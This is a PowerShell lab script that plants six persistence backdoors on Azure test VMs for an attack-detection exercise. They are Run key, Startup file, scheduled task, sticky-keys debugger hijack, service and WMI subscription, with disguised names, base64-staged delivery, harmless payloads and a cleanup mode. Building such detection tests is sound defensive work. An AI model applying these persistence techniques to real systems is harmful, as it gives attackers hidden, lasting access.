param(
    [string]$ResourceGroup = 'rg-uc3-lab',
    [string]$MainVm = 'opca-wks-01',
    [switch]$AllNow,
    [switch]$Cleanup
)
# LAB VMs ONLY. Attack Detection lab test 7, "Hidden backdoor that survives a restart" (3 days). Run in Azure
# PowerShell (Cloud Shell), signed in to the subscription that holds the lab VMs. It runs inside the VM through Azure
# Run Command (as SYSTEM). Every backdoor only runs "cmd /c rem" (does nothing) or Notepad.
#
#   ./Test-07-HiddenBackdoor.ps1           day 1 now: Run key and Startup file SysHealthMonitor. Days 2 and 3 are
#                                          scheduled in the VM for the same time tomorrow and the day after:
#                                          day 2 task SystemCacheCleanup and the sticky-keys backdoor (Notepad);
#                                          day 3 service WinUpdateAssist and the WMI trigger SysHealthFilter.
#                                          Day 1: searches 1, 2; day 2 adds 3, 6; day 3 adds 4, 7, in one growing story.
#   ./Test-07-HiddenBackdoor.ps1 -AllNow   all three days at once, for a quick check.
#   ./Test-07-HiddenBackdoor.ps1 -Cleanup  removes every backdoor and the scheduled days.

$ErrorActionPreference = 'Stop'

function Invoke-OnVm([string]$Vm, [string]$Script) {
    $file = Join-Path ([IO.Path]::GetTempPath()) "attacklab-$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -Path $file -Value $Script -Encoding UTF8
    try {
        Write-Host "Running on $Vm through Azure Run Command (a minute or two)..." -ForegroundColor Cyan
        $result = Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroup -VMName $Vm -CommandId RunPowerShellScript -ScriptPath $file
        foreach ($v in $result.Value) { if ($v.Message) { Write-Host $v.Message } }
    } finally { Remove-Item $file -ErrorAction SilentlyContinue }
}

$day1 = @'
& reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SysHealthMonitor /t REG_SZ /d "C:\Windows\System32\cmd.exe /c rem" /f | Out-Null
Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SysHealthMonitor.cmd" '@rem lab'
Write-Output '[done] day 1: Run key and Startup file SysHealthMonitor'
'@

$day2 = @'
& schtasks.exe /create /tn SystemCacheCleanup /tr "C:\Windows\System32\cmd.exe /c rem" /sc daily /st 03:00 /ru SYSTEM /f | Out-Null
& reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\Windows\System32\notepad.exe /f | Out-Null
Write-Output '[done] day 2: task SystemCacheCleanup and the sticky-keys backdoor'
'@

$day3 = @'
& sc.exe create WinUpdateAssist binPath= "C:\Windows\System32\cmd.exe /c rem" start= demand | Out-Null
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name = 'SysHealthFilter'
    EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 4"}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name = 'SysHealthFilter'
    CommandLineTemplate = 'C:\Windows\System32\cmd.exe /c echo lab> C:\ProgramData\SysHealth\wmi.txt'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $f; Consumer = $c} | Out-Null
Write-Output '[done] day 3: service WinUpdateAssist and the WMI trigger SysHealthFilter'
'@

# days 2 and 3 are written to files in the VM and run by one-time tasks at this time tomorrow and the day after
$schedule = @'
$ErrorActionPreference = 'Continue'
New-Item C:\ProgramData\SysHealth -ItemType Directory -Force | Out-Null
__DAY1__
$days = @{ 2 = '__DAY2__'; 3 = '__DAY3__' }
foreach ($n in 2, 3) {
    $file = "C:\ProgramData\SysHealth\day$n.ps1"
    Set-Content $file ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($days[$n])))
    $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-NoProfile -ExecutionPolicy Bypass -File $file"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays($n - 1)
    Register-ScheduledTask "SysHealthDay$n" -Action $action -Trigger $trigger -User SYSTEM -RunLevel Highest -Force | Out-Null
}
Write-Output "[done] days 2 and 3 scheduled for $((Get-Date).AddDays(1).ToString('ddd HH:mm')) and $((Get-Date).AddDays(2).ToString('ddd HH:mm')) (VM time)"
'@

$cleanup = @'
$ErrorActionPreference = 'Continue'
& reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SysHealthMonitor /f 2>&1 | Out-Null
Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SysHealthMonitor.cmd" -Force -ErrorAction SilentlyContinue
& schtasks.exe /delete /tn SystemCacheCleanup /f 2>&1 | Out-Null
& reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f 2>&1 | Out-Null
& sc.exe delete WinUpdateAssist 2>&1 | Out-Null
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*SysHealthFilter*' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SysHealthFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SysHealthFilter'" | Remove-WmiObject
foreach ($n in 2, 3) { Unregister-ScheduledTask "SysHealthDay$n" -Confirm:$false -ErrorAction SilentlyContinue
                       Remove-Item "C:\ProgramData\SysHealth\day$n.ps1" -Force -ErrorAction SilentlyContinue }
Remove-Item C:\ProgramData\SysHealth\wmi.txt -Force -ErrorAction SilentlyContinue
Write-Output '[done] all five backdoors and the scheduled days removed'
'@

if ($Cleanup) { Invoke-OnVm $MainVm $cleanup; return }
if ($AllNow) {
    Invoke-OnVm $MainVm ("New-Item C:\ProgramData\SysHealth -ItemType Directory -Force | Out-Null`n" + $day1 + "`n" + $day2 + "`n" + $day3)
} else {
    # days 2 and 3 travel as base64, so the VM stores them exactly as written
    $b64 = { param($s) [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)) }
    Invoke-OnVm $MainVm $schedule.Replace('__DAY1__', $day1).Replace('__DAY2__', (& $b64 $day2)).Replace('__DAY3__', (& $b64 $day3))
}
Write-Host "`nRun the Attack Detection Agent once a day (wait 15-60 minutes after each day's step); the story on $MainVm grows."
